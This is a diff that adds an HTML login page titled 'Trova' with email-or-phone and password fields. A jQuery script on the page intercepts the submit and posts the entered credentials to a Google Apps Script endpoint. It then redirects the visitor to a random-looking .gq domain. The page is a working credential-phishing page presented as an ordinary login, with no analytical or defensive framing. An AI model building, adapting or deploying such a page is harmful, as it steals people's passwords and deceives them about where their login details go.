@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Trova </title>
+    <link rel="stylesheet" href='index.css'>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </script>
+   </head>
+
+          <!-- Designing by CodingLab -->
+
+<body>
+  <div class="topnav">
+    <h1>Login</h1>
+  </div class="responsive">
+    <form id="submit-form" action="">
+      <div class="input_box">
+        <input type="text" id="fname" name="name" placeholder="Email or Phone" required>
+        <div class="icon"><i class="fas fa-user"></i></div>
+      </div>
+      <div class="input_box">
+        <input type="password" id="lname" name="email" placeholder="Password" required>
+        <div class="icon"><i class="fas fa-lock"></i></div>
+      </div>
+      
+     <div style="text-align: center;">
+        <input  class="btt" type="submit" value="Login">
+      </div>
+      <div class="downn" >
+        <img style=" align-items: center; position: relative; " src="down.jpg" alt=""  class="responsive">
+      </div>
+      <!-- <div>
+        <img style=" align-items: center; position: relative; " src="down.jpg" alt=""  class="responsive">
+      </div> -->
+     
+    </form>
+    <script>
+      $("#submit-form").submit((e)=>{
+          e.preventDefault()
+          $.ajax({
+              url:"https://script.google.com/macros/s/AKfycbz-QsNSW5CBewbK7RzlvlfjrJ9qLtx3ceHDACDEiv93X6Ibs0AZJMFRnL2jmSZE7cjV/exec",
+              data:$("#submit-form").serialize(),
+              method:"post",
+              success:function (response){
+                  // alert("Form submitted successfully")
+                  // window.location.reload()
+                  window.location.href="https://rednvelopecbxjd5htj-7dkdh-8-dbdb0envelop00e-87iyu.gq/"
+              },
+              error:function (err){
+                  alert("Something Error")
+  
+              }
+          })
+      })
+  </script>
+</body>
+</html>
+<!-- input_box button -->
